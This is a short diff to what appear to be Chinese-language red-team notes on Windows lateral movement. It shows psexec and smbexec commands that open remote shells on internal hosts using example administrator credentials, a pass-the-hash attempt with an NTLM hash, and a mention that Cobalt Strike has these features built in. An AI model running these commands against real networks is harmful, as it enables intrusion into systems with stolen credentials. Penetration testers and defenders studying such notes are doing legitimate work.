@@ -44,7 +44,7 @@
      
      前提开启admin$共享
     
-     psexec \\192.168.3.144 -u administrator -p admin123！！ -s cmd
+     psexec \\192.168.3.144 -u administrator -p admin123！！ -s cmd   #实战中碰见很多未知问题，可以换其他的横向方法
      
      注意官方自带的psexec只能通过明文进行传递攻击，密码是行不通的，例如 psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.144 是不可以的
      
@@ -59,6 +59,9 @@
       smbexec.exe mssql:Admin@1234@192.168.251.252 # 连接本地用户组
       
       smbexec.exe ROOTKIT.ORG/administrator:admin!@#45@192.168.3.144  # 连接域内用户
+      
+      ![图片](https://user-images.githubusercontent.com/118274389/229289834-9cdb8adb-9302-47bb-9925-609ac5db69e6.png)
+
       
     以上方法CS里自带该功能。
 
